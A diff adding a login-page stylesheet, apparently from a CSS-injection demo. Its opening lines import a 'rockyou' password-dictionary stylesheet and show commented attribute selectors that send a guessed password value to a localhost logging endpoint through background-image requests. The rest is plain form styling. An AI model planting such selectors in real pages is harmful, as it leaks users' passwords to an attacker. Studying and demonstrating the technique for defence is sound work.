@@ -1,0 +1,119 @@
+@charset "UTF-8";
+
+/* import your own dictionary file from a remote location */
+@import url('http://localhost/css/rockyou_1000.css');
+
+/* or copy and paste */
+/* input[name=pwd][value="password"]{background-image:url(http://localhost/api/css.php?v=password)} */
+/* input[name=pwd][value="iloveyou"]{background-image:url(http://localhost/api/css.php?v=iloveyou)} */
+/* input[name=pwd][value="princess"]{background-image:url(http://localhost/api/css.php?v=princess)} */
+/* ... */
+
+/* --------------------CUSTOMIZATION-------------------- */
+
+:root {
+	/* add more customizations to your liking */
+
+	--default-body-background-color: #262626;
+	--default-body-color: #F8F8F8;
+	--default-body-font-family: Arial, Helvetica, sans-serif;
+}
+
+/* --------------------GLOBAL-------------------- */
+
+html {
+	height: 100%;
+}
+body {
+	background-color: var(--default-body-background-color);
+	display: flex;
+	flex-direction: column;
+	margin: 0;
+	height: inherit;
+	color: var(--default-body-color);
+	font-family: var(--default-body-font-family);
+	font-size: 1em;
+	font-weight: 400;
+	text-align: left;
+}
+
+/* --------------------FRONT FORM-------------------- */
+
+.front-form {
+	display: flex;
+	align-items: center;
+	justify-content: center;
+	flex: 1 0 auto;
+	padding: 0.5em;
+}
+.front-form .layout {
+	background-color: #DCDCDC;
+	padding: 1.5em;
+	width: 21em;
+	color: #000;
+	border: 0.07em solid #000;
+}
+.front-form .layout header .title {
+	margin: 0;
+	font-size: 2.6em;
+	font-weight: 400;
+	text-align: center;
+}
+.front-form .layout .error-global {
+	margin: 0;
+	color: #9D2A00;
+	font-size: 0.8em;
+}
+.front-form .layout .error-global:not(:empty) {
+	margin-top: 1em;
+}
+.front-form .layout form {
+	display: flex;
+	flex-direction: column;
+	margin-top: 0.8em;
+}
+.front-form .layout form label {
+	height: 1.2em;
+}
+.front-form .layout form input {
+	-webkit-appearance: none;
+	-moz-appearance: none;
+	appearance: none;
+	margin: 0;
+	padding: 0.2em 0.4em;
+	font-family: var(--default-body-font-family);
+	font-size: 1em;
+	border: 0.07em solid #9D2A00;
+	-webkit-border-radius: 0;
+	-moz-border-radius: 0;
+	border-radius: 0;
+}
+.front-form .layout form input[type="submit"] {
+	background-color: #FF4500;
+	color: #F8F8F8;
+	cursor: pointer;
+	transition: background-color 220ms linear;
+}
+.front-form .layout form input[type="submit"]:hover {
+	background-color: #D83A00;
+	transition: background-color 220ms linear;
+}
+.front-form .layout form .error {
+	margin: 0 0 1em 0;
+	color: #9D2A00;
+	font-size: 0.8em;
+}
+.front-form .layout form .error:not(:empty) {
+	margin-top: 0.25em;
+}
+
+/* --------------------MEDIA QUERIES-------------------- */
+
+@media screen and (max-width: 320px) {
+	.front-form .layout {
+		width: 15.5em;
+	}
+	.front-form .layout header .title {
+		font-size: 2.0em;
+	}
+}
